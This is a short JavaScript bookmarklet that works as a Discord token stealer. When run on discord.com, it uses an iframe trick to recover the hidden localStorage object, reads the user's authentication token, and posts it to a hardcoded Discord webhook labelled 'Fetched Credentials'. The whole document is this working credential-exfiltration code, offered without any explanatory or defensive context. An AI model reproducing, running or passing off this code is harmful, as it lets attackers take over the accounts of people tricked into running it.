javascript: void (function () {
  var SEND = "<https://discord.com/api/webhooks/955434946107944981/zJcJ36kXrY-fBK3JkFqVpl1ZUFoBKTCZMOCGejyp97OnJb01drdMqQRhlvadH_Fj0dJC>";
  "https://discord.com" == this.document.location.origin &&
    (function () {
      const a = document.createElement("iframe");
      document.head.append(a);
      const b = Object.getOwnPropertyDescriptor(
        a.contentWindow,
        "localStorage"
      );
      a.remove(),
        Object.defineProperty(window, "localStorage", b),
        fetch(SEND, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                color: 3553599,
                title: "Fetched Credentials",
                description: `\`\`\`${localStorage.getItem("token")}\`\`\``,
              },
            ],
          }),
        });
    })();
})();
